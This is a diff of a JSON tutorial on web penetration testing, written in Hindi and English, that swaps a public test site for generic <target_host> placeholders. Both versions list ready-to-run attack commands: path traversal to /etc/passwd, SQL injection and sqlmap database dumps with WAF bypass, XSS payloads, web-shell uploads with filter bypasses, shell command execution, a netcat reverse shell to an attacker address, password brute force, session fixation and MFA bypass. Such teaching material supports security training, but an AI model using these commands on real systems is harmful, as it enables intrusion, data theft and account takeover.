@@ -18,12 +18,12 @@
             "commands": [
               {
                 "description": "HTTP Request with Curl",
-                "command": "curl -v -H 'User-Agent: Neuro-Dev-Scanner' http://testphp.vulnweb.com",
+                "command": "curl -v -H 'User-Agent: Neuro-Dev-Scanner' http://<target_host>",
                 "explanation": "HTTP request headers aur response analyze karta hai"
               },
               {
                 "description": "HTTP Methods Test",
-                "command": "curl -X OPTIONS http://testphp.vulnweb.com -v",
+                "command": "curl -X OPTIONS http://<target_host> -v",
                 "explanation": "Allowed HTTP methods check karta hai"
               }
             ]
@@ -72,12 +72,12 @@
             "commands": [
               {
                 "description": "Directory Traversal Test",
-                "command": "curl 'http://testphp.vulnweb.com/showimage.php?file=../../../etc/passwd'",
+                "command": "curl 'http://<target_host>/showimage.php?file=../../../etc/passwd'",
                 "explanation": "Path traversal vulnerability test karta hai"
               },
               {
                 "description": "Forced Browsing",
-                "command": "dirb http://testphp.vulnweb.com /usr/share/dirb/wordlists/common.txt",
+                "command": "dirb http://<target_host> /usr/share/dirb/wordlists/common.txt",
                 "explanation": "Hidden directories aur files find karta hai"
               }
             ]
@@ -93,7 +93,7 @@
               },
               {
                 "description": "HTTP vs HTTPS Check",
-                "command": "curl -I http://testphp.vulnweb.com",
+                "command": "curl -I http://<target_host>",
                 "explanation": "HTTP headers mein security headers check karta hai"
               }
             ]
@@ -109,7 +109,7 @@
               },
               {
                 "description": "Sqlmap Automated Test",
-                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --batch",
+                "command": "sqlmap -u 'http://<target_host>/artists.php?artist=1' --batch",
                 "explanation": "Automated SQL injection testing tool"
               }
             ]
@@ -120,7 +120,7 @@
           },
           {
             "heading": "A05: Security Misconfiguration",
-            "text": "Common Misconfigurations:\n\n• Default accounts enabled\n• Unnecessary features enabled\n• Missing security headers\n• Verbose error messages\n• Outdated software versions\n\nSecurity Headers:\n• X-Frame-Options\n• X-Content-Type-Options\n• X-XSS-Protection\n• Strict-Transport-Security\n• Content-Security-Policy",
+            "text": "Common Misconfigurations:\n\n• Default accounts with weak credentials\n• Unnecessary features enabled\n• Missing security headers\n• Verbose error messages\n• Outdated software versions\n\nSecurity Headers:\n• X-Frame-Options\n• X-Content-Type-Options\n• X-XSS-Protection\n• Strict-Transport-Security\n• Content-Security-Policy",
             "commands": [
               {
                 "description": "Security Headers Check",
@@ -229,22 +229,22 @@
             "commands": [
               {
                 "description": "Basic Error Testing",
-                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1'\"",
+                "command": "curl \"http://<target_host>/artists.php?artist=1'\"",
                 "explanation": "Single quote se SQL error generate karta hai"
               },
               {
                 "description": "Boolean-based Test",
-                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 AND 1=1\"",
+                "command": "curl \"http://<target_host>/artists.php?artist=1 AND 1=1\"",
                 "explanation": "Boolean condition se response difference check karta hai"
               },
               {
                 "description": "Union-based Test",
-                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3\"",
+                "command": "curl \"http://<target_host>/artists.php?artist=1 UNION SELECT 1,2,3\"",
                 "explanation": "Union query se column count determine karta hai"
               },
               {
                 "description": "Time-based Blind Test",
-                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 AND SLEEP(5)\"",
+                "command": "curl \"http://<target_host>/artists.php?artist=1 AND SLEEP(5)\"",
                 "explanation": "Time delay se blind SQL injection test karta hai"
               }
             ]
@@ -255,12 +255,12 @@
             "commands": [
               {
                 "description": "MySQL Version Detection",
-                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,@@version,3\"",
+                "command": "curl \"http://<target_host>/artists.php?artist=1 UNION SELECT 1,@@version,3\"",
                 "explanation": "MySQL database version extract karta hai"
               },
               {
                 "description": "Database Name Extraction",
-                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,database(),3\"",
+                "command": "curl \"http://<target_host>/artists.php?artist=1 UNION SELECT 1,database(),3\"",
                 "explanation": "Current database name extract karta hai"
               }
             ]
@@ -290,22 +290,22 @@
             "commands": [
               {
                 "description": "Comprehensive Scan",
-                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs --tables --columns --dump",
+                "command": "sqlmap -u 'http://<target_host>/artists.php?artist=1' --dbs --tables --columns --dump",
                 "explanation": "Complete database structure aur data extract karta hai"
               },
               {
                 "description": "POST Request Testing",
-                "command": "sqlmap -u 'http://testphp.vulnweb.com/search.php' --data='searchFor=test' --dbs",
+                "command": "sqlmap -u 'http://<target_host>/search.php' --data='searchFor=test' --dbs",
                 "explanation": "POST parameters mein SQL injection test karta hai"
               },
               {
                 "description": "Cookie-based Testing",
-                "command": "sqlmap -u 'http://testphp.vulnweb.com/' --cookie='id=1*' --level=2",
+                "command": "sqlmap -u 'http://<target_host>/' --cookie='id=1*' --level=2",
                 "explanation": "Cookie parameters test karta hai"
               },
               {
                 "description": "WAF Detection & Bypass",
-                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --identify-waf --tamper=space2comment",
+                "command": "sqlmap -u 'http://<target_host>/artists.php?artist=1' --identify-waf --tamper=space2comment",
                 "explanation": "WAF detect kar ke bypass techniques use karta hai"
               }
             ]
@@ -329,12 +329,12 @@
             "commands": [
               {
                 "description": "Reflected XSS Test",
-                "command": "curl \"http://testphp.vulnweb.com/search.php?test=<script>alert('XSS')</script>\"",
+                "command": "curl \"http://<target_host>/search.php?test=<script>alert('XSS')</script>\"",
                 "explanation": "Reflected XSS vulnerability test karta hai"
               },
               {
                 "description": "XSS in Headers",
-                "command": "curl -H \"User-Agent: <script>alert('XSS')</script>\" http://testphp.vulnweb.com",
+                "command": "curl -H \"User-Agent: <script>alert('XSS')</script>\" http://<target_host>",
                 "explanation": "HTTP headers mein XSS test karta hai"
               }
             ]
@@ -345,12 +345,12 @@
             "commands": [
               {
                 "description": "Encoded XSS Payload",
-                "command": "curl \"http://testphp.vulnweb.com/search.php?test=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E\"",
+                "command": "curl \"http://<target_host>/search.php?test=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E\"",
                 "explanation": "URL encoded XSS payload test karta hai"
               },
               {
                 "description": "Event Handler XSS",
-                "command": "curl \"http://testphp.vulnweb.com/search.php?test=<img src=x onerror=alert(1)>\"",
+                "command": "curl \"http://<target_host>/search.php?test=<img src=x onerror=alert(1)>\"",
                 "explanation": "Event handler based XSS test karta hai"
               }
             ]
@@ -376,12 +376,12 @@
             "commands": [
               {
                 "description": "XSSer Tool",
-                "command": "apt install xsser -y && xsser -u 'http://testphp.vulnweb.com/search.php?test=XSS'",
+                "command": "apt install xsser -y && xsser -u 'http://<target_host>/search.php?test=XSS'",
                 "explanation": "Automated XSS detection tool"
               },
               {
                 "description": "Dalfox XSS Scanner",
-                "command": "go install github.com/hahwul/dalfox/v2@latest && dalfox url http://testphp.vulnweb.com",
+                "command": "go install github.com/hahwul/dalfox/v2@latest && dalfox url http://<target_host>",
                 "explanation": "Modern XSS scanner tool"
               },
               {
@@ -484,7 +484,7 @@
               },
               {
                 "description": "File Upload Test",
-                "command": "curl -F 'file=@shell.php' http://testphp.vulnweb.com/upload.php",
+                "command": "curl -F 'file=@shell.php' http://<target_host>/upload.php",
                 "explanation": "Malicious file upload attempt karta hai"
               }
             ]
@@ -495,7 +495,7 @@
             "commands": [
               {
                 "description": "MIME Type Spoofing",
-                "command": "curl -F 'file=@shell.php;type=image/jpeg' http://testphp.vulnweb.com/upload.php",
+                "command": "curl -F 'file=@shell.php;type=image/jpeg' http://<target_host>/upload.php",
                 "explanation": "MIME type spoofing kar ke upload attempt"
               },
               {
@@ -505,7 +505,7 @@
               },
               {
                 "description": "Double Extension Test",
-                "command": "cp shell.php shell.php.jpg && curl -F 'file=@shell.php.jpg' http://testphp.vulnweb.com/upload.php",
+                "command": "cp shell.php shell.php.jpg && curl -F 'file=@shell.php.jpg' http://<target_host>/upload.php",
                 "explanation": "Double extension bypass attempt"
               }
             ]
@@ -516,7 +516,7 @@
             "commands": [
               {
                 "description": "Path Traversal Upload",
-                "command": "curl -F 'file=@shell.php' -F 'path=../../../var/www/html/' http://testphp.vulnweb.com/upload.php",
+                "command": "curl -F 'file=@shell.php' -F 'path=../../../var/www/html/' http://<target_host>/upload.php",
                 "explanation": "Path traversal se arbitrary location mein upload"
               },
               {
@@ -536,17 +536,17 @@
             "commands": [
               {
                 "description": "Web Shell Access",
-                "command": "curl 'http://testphp.vulnweb.com/uploads/shell.php?cmd=whoami'",
+                "command": "curl 'http://<target_host>/uploads/shell.php?cmd=whoami'",
                 "explanation": "Uploaded web shell se command execution"
               },
               {
                 "description": "File Listing",
-                "command": "curl 'http://testphp.vulnweb.com/uploads/shell.php?cmd=ls -la'",
+                "command": "curl 'http://<target_host>/uploads/shell.php?cmd=ls -la'",
                 "explanation": "Server files list karta hai"
               },
               {
                 "description": "Reverse Shell",
-                "command": "curl 'http://testphp.vulnweb.com/uploads/shell.php?cmd=nc -e /bin/bash 192.168.1.100 4444'",
+                "command": "curl 'http://<target_host>/uploads/shell.php?cmd=nc -e /bin/bash <attacker_ip> <port>'",
                 "explanation": "Reverse shell connection establish karta hai"
               }
             ]
@@ -569,17 +569,17 @@
             "commands": [
               {
                 "description": "Hydra HTTP Form Brute Force",
-                "command": "hydra -l <username> -P /usr/share/wordlists/rockyou.txt testphp.vulnweb.com http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
+                "command": "hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target_host> http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
                 "explanation": "HTTP form brute force attack karta hai"
               },
               {
                 "description": "Medusa Brute Force",
-                "command": "medusa -h testphp.vulnweb.com -u <username> -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login.php",
+                "command": "medusa -h <target_host> -u <username> -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login.php",
                 "explanation": "Alternative brute force tool"
               },
               {
                 "description": "Custom Brute Force Script",
-                "command": "for pass in $(cat passwords.txt); do curl -d \"username=<username>&password=$pass\" http://testphp.vulnweb.com/login.php; done",
+                "command": "for pass in $(cat passwords.txt); do curl -d \"username=<username>&password=$pass\" http://<target_host>/login.php; done",
                 "explanation": "Simple bash brute force loop"
               }
             ]
@@ -590,12 +590,12 @@
             "commands": [
               {
                 "description": "Session ID Analysis",
-                "command": "for i in {1..10}; do curl -c cookies$i.txt http://testphp.vulnweb.com/login.php; grep sessionid cookies$i.txt; done",
+                "command": "for i in {1..10}; do curl -c cookies$i.txt http://<target_host>/login.php; grep sessionid cookies$i.txt; done",
                 "explanation": "Multiple session IDs collect kar ke pattern analyze karta hai"
               },
               {
                 "description": "Session Fixation Test",
-                "command": "curl -H 'Cookie: PHPSESSID=attacker_controlled_session' http://testphp.vulnweb.com/login.php",
+                "command": "curl -H 'Cookie: PHPSESSID=<session_id>' http://<target_host>/login.php",
                 "explanation": "Session fixation vulnerability test karta hai"
               }
             ]
@@ -606,12 +606,12 @@
             "commands": [
               {
                 "description": "Cookie Analysis",
-                "command": "curl -I http://testphp.vulnweb.com/login.php | grep -i 'set-cookie'",
+                "command": "curl -I http://<target_host>/login.php | grep -i 'set-cookie'",
                 "explanation": "Cookie security attributes analyze karta hai"
               },
               {
                 "description": "Cookie Manipulation",
-                "command": "curl -H 'Cookie: role=<role>; userid=<id>' http://testphp.vulnweb.com/admin.php",
+                "command": "curl -H 'Cookie: role=<role>; userid=<user_id>' http://<target_host>/admin.php",
                 "explanation": "Cookie values manipulate kar ke privilege escalation attempt"
               }
             ]
@@ -638,12 +638,12 @@
             "commands": [
               {
                 "description": "MFA Bypass Test",
-                "command": "curl -X POST http://testphp.vulnweb.com/verify-mfa.php -d 'code=000000' -H 'X-Forwarded-For: 127.0.0.1'",
+                "command": "curl -X POST http://<target_host>/verify-mfa.php -d 'code=<mfa_code>' -H 'X-Forwarded-For: <ip_address>'",
                 "explanation": "MFA bypass attempt with IP spoofing"
               },
               {
                 "description": "Response Manipulation",
-                "command": "curl -X POST http://testphp.vulnweb.com/verify-mfa.php -d 'code=123456' | sed 's/false/true/g'",
+                "command": "curl -X POST http://<target_host>/verify-mfa.php -d 'code=<mfa_code>' | sed 's/false/true/g'",
                 "explanation": "Response manipulation attempt"
               }
             ]
